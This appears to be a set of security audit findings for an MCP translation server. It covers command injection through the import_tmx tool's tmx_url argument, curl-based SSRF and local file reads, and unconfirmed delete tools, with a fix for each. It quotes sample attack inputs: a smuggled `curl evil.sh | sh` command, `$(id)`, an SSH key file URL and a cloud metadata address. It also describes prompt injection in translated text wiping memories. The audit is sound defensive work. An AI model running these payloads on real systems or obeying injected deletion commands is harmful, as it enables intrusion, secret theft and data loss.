message: Tool input reaches a dangerous call: a helper that runs its argument through a shell (exec).
fix: Do not shell out: download with fetch() (or execFile('curl', ['-L', '--proto', '=https', '-o', tempFilePath, '--', tmx_url])) after checking tmx_url is an https URL on an allowed host.

evidence.quote: const { id, tmx_content, tmx_url, gzip } = validatedArgs;

reason: tmx_url from the import_tmx tool arguments (only checked to be a string) is put inside double quotes in a command run by child_process.exec, so `x"; curl evil.sh | sh; "` or `$(id)` runs arbitrary commands as the server user, with LARA_ACCESS_KEY_SECRET in its environment.

message: Tool input reaches a dangerous call: a file is written / deleted / moved at a path taken from tool input.
fix: None needed for path traversal; optionally create the file with mkdtemp and flag 'wx' to avoid symlink races in a shared /tmp.
reason: The write path is generated by the server inside os.tmpdir()/lara-tmx-imports; only the file content (tmx_content) comes from the tool arguments, so no attacker-chosen path is written or deleted.

title: import_tmx makes curl fetch any URL or local file and uploads it

evidence.quote: const { id, tmx_content, tmx_url, gzip } = validatedArgs;

reason: Even without shell metacharacters, curl accepts any scheme and follows redirects, so tmx_url `file:///home/user/.ssh/id_rsa` or `http://169.254.169.254/...` makes the server read local files or internal services and upload the result to the Lara account.
fix: Allow only https URLs to an allowlist of hosts, resolve the host and block private/loopback/link-local ranges, and disable redirects or re-check each hop (curl --proto =https --proto-redir =https, or fetch with redirect: 'manual').

title: Delete tools remove translation memories with no confirmation
reason: delete_memory (and delete_translation) act immediately on any memory id the model supplies, so a prompt injection in the text being translated can wipe the account's translation memories.
fix: Mark these tools destructive (MCP annotations destructiveHint: true) so clients ask for approval, or require an explicit confirm argument echoing the memory name.
